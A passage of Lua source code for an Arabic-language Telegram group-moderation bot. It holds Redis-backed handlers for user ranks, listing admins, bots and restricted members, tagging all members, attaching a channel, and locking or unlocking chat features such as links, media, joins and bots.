return send(msg_chat_id,msg_id,"*٠ امر نزلني تم تعطيله من قبل المدراء *","md",true)  
end
if The_ControllerAll(msg.sender.user_id) == true then
Rink = 1
elseif Redis:sismember(darket.."Devss:Groups",msg.sender.user_id)  then
Rink = 2
elseif Redis:sismember(darket.."Dev:Groups",msg.sender.user_id)  then
Rink = 3
elseif Redis:sismember(darket.."Owners:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 4
elseif Redis:sismember(darket.."Supcreator:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 5
elseif Redis:sismember(darket.."Creator:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 6
elseif Redis:sismember(darket.."Manger:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 7
elseif Redis:sismember(darket.."Admin:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 8
elseif Redis:sismember(darket.."Special:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 9
else
Rink = 10
end
if Rink == 10 then
return send(msg_chat_id,msg_id,"\n*٠ليس لديك رتب عزيزي *","md",true)  
end
if Rink <= 7  then
return send(msg_chat_id,msg_id,"٠استطيع تنزيل الادمنيه والمميزين فقط","md",true) 
else
Redis:srem(darket.."Admin:Group"..msg_chat_id, msg.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ تم تنزيلك من الادمنيه والمميزين ","md",true) 
end
end

if text == 'اطردني' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تأكيد', url = 't.me/'..UserBot..'?start=st'..msg_chat_id..'u'..msg.sender.user_id..''}, 
},
}
}
return send(msg_chat_id,msg_id, [[
اصغط لتأكيد طردك
]],"md",true, false, false, true, reply_markup)
end

if text == 'ادمنيه الكروب' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
listAdmin = '\n*٠ قائمه الادمنيه \n – – – – – – – –*\n'
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Creator = '→ *{ المالك }*'
else
Creator = ""
end
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listAdmin = listAdmin.."*"..k.." - @"..UserInfo.username.."* "..Creator.."\n"
else
listAdmin = listAdmin.."*"..k.." - *["..UserInfo.id.."](tg://user?id="..UserInfo.id..") "..Creator.."\n"
end
end
send(msg_chat_id,msg_id,listAdmin,"md",true)  
end
if text == 'رفع الادمنيه' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(darket.."Supcreator:Group"..msg_chat_id,v.member_id.user_id) 
x = x + 1
else
Redis:sadd(darket.."Admin:Group"..msg_chat_id,v.member_id.user_id) 
y = y + 1
end
end
end
send(msg_chat_id,msg_id,'\n*٠ تم ترقيه - ('..y..') ادمنيه *',"md",true)  
end

if text == 'المالك' then
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.first_name == "" then
send(msg_chat_id,msg_id,"*٠اوبس , المالك حسابه محذوف *","md",true)  
return false
end
if UserInfo.username then
Creator = "*٠مالك الكروب : @"..UserInfo.username.."*\n"
else
Creator = "٠مالك الكروب : *["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n"
end
return send(msg_chat_id,msg_id,Creator,"md",true)  
end
end
end


if text == 'كشف البوتات' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
listBots = '\n*٠ قائمه البوتات \n – – – – – – – –*\n'
x = 0
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if Info_Members.members[k].status.luatele == "chatMemberStatusAdministrator" then
x = x + 1
Admin = '→ *{ ادمن }*'
else
Admin = ""
end
listBots = listBots.."*"..k.." - @"..UserInfo.username.."* "..Admin.."\n"
end
send(msg_chat_id,msg_id,listBots.."*\n– – – – – – – –\n٠عدد البوتات التي هي ادمن ( "..x.." )*","md",true)  
end


 
if text == 'المقيدين' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Recent", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = nil
restricted = '\n*٠ قائمه المقيديين \n – – – – – – – –*\n'
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.is_member == true and Info_Members.members[k].status.luatele == "chatMemberStatusRestricted" then
y = true
x = x + 1
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
restricted = restricted.."*"..x.." - @"..UserInfo.username.."*\n"
else
restricted = restricted.."*"..x.." - *["..UserInfo.id.."](tg://user?id="..UserInfo.id..") \n"
end
end
end
if y == true then
send(msg_chat_id,msg_id,restricted,"md",true)  
end
end


if text == "غادر" then 
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(darket.."LeftBot") then
return send(msg_chat_id,msg_id,'\n*٠ امر المغادره معطل من قبل الاساسي *',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
send(msg_chat_id,msg_id,"*\n٠ تم مغادرة الكروب بامر من المطور *","md",true)  
local Left_Bot = LuaTele.leaveChat(msg.chat_id)
end
if text == 'تاك للكل' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
local List_Members = Info_Members.members
listall = '\n*٠ قائمه الاعضاء \n – – – – – – – –*\n'
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listall = listall.."*"..k.." - @"..UserInfo.username.."*\n"
else
listall = listall.."*"..k.." -* ["..UserInfo.id.."](tg://user?id="..UserInfo.id..")\n"
end
end
send(msg_chat_id,msg_id,listall,"md",true)  
end
if Redis:get(darket.."addchannel"..msg.sender.user_id) == "on" then
if text and text:match("^@[%a%d_]+$") then
local m , res = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if res == 200 then
ch = data.result.id
Redis:set(darket.."chadmin"..msg_chat_id,ch) 
send(msg_chat_id,msg_id,"٠︙ تم حفظ ايدي القناه","md",true)  
else
send(msg_chat_id,msg_id,"٠︙ المعرف خطأ","md",true)  
end
elseif text and text:match('^-100(%d+)$') then
ch = text
Redis:set(darket.."chadmin"..msg_chat_id,ch) 
send(msg_chat_id,msg_id,"٠︙ تم حفظ ايدي القناه","md",true)  
elseif text and not text:match('^-100(%d+)$') then
send(msg_chat_id,msg_id,"٠︙ الايدي خطأ","md",true)  
end
Redis:del(darket.."addchannel"..msg.sender.user_id)
end
if text == "القناه المضافه" then
if Redis:get(darket.."chadmin"..msg_chat_id) then
send(msg_chat_id,msg_id,Redis:get(darket.."chadmin"..msg_chat_id),"md",true)  
else 
send(msg_chat_id,msg_id,"٠︙ لا توجد قناه ","md",true)  
end 
end
if text == "حذف القناه" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠︙ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if Redis:get(darket.."chadmin"..msg_chat_id) then
Redis:del(darket.."chadmin"..msg_chat_id) 
send(msg_chat_id,msg_id,"٠︙ تم حذف القناه بنجاح","md",true)  
else 
send(msg_chat_id,msg_id,"٠︙ لا توجد قناه ","md",true)  
end 
end
if text == "اضف قناه" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠︙ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket.."addchannel"..msg.sender.user_id,"on") 
send(msg_chat_id,msg_id,"٠︙ ارسل يوزر او ايدي القناه","md",true)  
end
if text == "قفل القناه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠︙ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠︙ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:channell"..msg_chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠︙ تم قفـل القنوات").Lock,"md",true)  
return false
end 
if text == "قفل الدردشه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Lock:text"..msg_chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الدردشه").Lock,"md",true)  
return false
end 
if text == "قفل الاضافه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:AddMempar"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل اضافة الاعضاء").Lock,"md",true)  
return false
end 
if text == "قفل الدخول" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:Join"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل دخول الاعضاء").Lock,"md",true)  
return false
end 
if text == "قفل البوتات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:Bot:kick"..msg_chat_id,"del")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل البوتات").Lock,"md",true)  
return false
end 
if text == "قفل البوتات بالطرد" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:Bot:kick"..msg_chat_id,"kick")  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل البوتات").lockKick,"md",true)  
return false
end 
if text == "قفل الاشعارات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(darket.."Lock:tagservr"..msg_chat_id,true)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل الاشعارات").Lock,"md",true)  
return false
end 
if text == "تعطيل all" or text == "تعطيل @all" then 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(darket.."lockalllll"..msg_chat_id,"off")
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل @all هنا").Lock,"md",true)  
return false
end 
if text == "تفعيل all" or text == "تفعيل @all" then 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(darket.."lockalllll"..msg_chat_id,"on")
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح @all هنا").Lock,"md",true)  
return false
end 
if text == "قفل التثبيت" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(darket.."lockpin"..msg_chat_id,(LuaTele.getChatPinnedMessage(msg_chat_id).id or true)) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل التثبيت هنا").Lock,"md",true)  
return false
end 
if text == "قفل التعديل" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:edit"..msg_chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل تعديل").Lock,"md",true)  
return false
end 
if text == "قفل تعديل الميديا" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(darket.."Lock:edit"..msg_chat_id,true) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل تعديل").Lock,"md",true)  
return false
end 
if text == "قفل الكل" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(darket.."Lock:tagservrbot"..msg_chat_id,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:set(darket..''..lock..msg_chat_id,"del")    
end
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم قفـل جميع الاوامر").Lock,"md",true)  
return false
end 


--------------------------------------------------------------------------------------------------------------
if text == "فتح الاضافه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:AddMempar"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح اضافة الاعضاء").unLock,"md",true)  
return false
end 
if text == "فتح القناه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:channell"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح القنوات").unLock,"md",true)  
return false
end 
if text and text:match("^وضع تكرار (%d+)$") then 
local Num = text:match("وضع تكرار (.*)")
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:hset(darket.."Spam:Group:User"..msg_chat_id ,"Num:Spam" ,Num) 
send(msg_chat_id,msg_id,'\n*٠ تم وضع عدد تكرار '..Num..'* ',"md",true)  
end
if text == "فتح الدردشه" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:text"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح الدردشه").unLock,"md",true)  
return false
end 
if text == "فتح الدخول" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:Join"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فتح دخول الاعضاء").unLock,"md",true)  
return false
end 
if text == "فتح البوتات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:Bot:kick"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح البوتات").unLock,"md",true)  
return false
end 
if text == "فتح البوتات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:Bot:kick"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح البوتات").unLock,"md",true)  
return false
end 
if text == "فتح الاشعارات" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:del(darket.."Lock:tagservr"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح الاشعارات").unLock,"md",true)  
return false
end 
if text == "فتح التثبيت" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."lockpin"..msg_chat_id)  
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح التثبيت هنا").unLock,"md",true)  
return false
end 
if text == "فتح التعديل" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:edit"..msg_chat_id) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح تعديل").unLock,"md",true)  
return false
end 
if text == "فتح التعديل الميديا" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:edit"..msg_chat_id) 
send(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"٠ تم فـتح تعديل").unLock,"md",true)  
return false
end 
if text == "فتح الكل" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(darket.."Lock:tagservrbot"..msg_chat_id)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:del(darket..''..lock..msg_chat_id)    
end
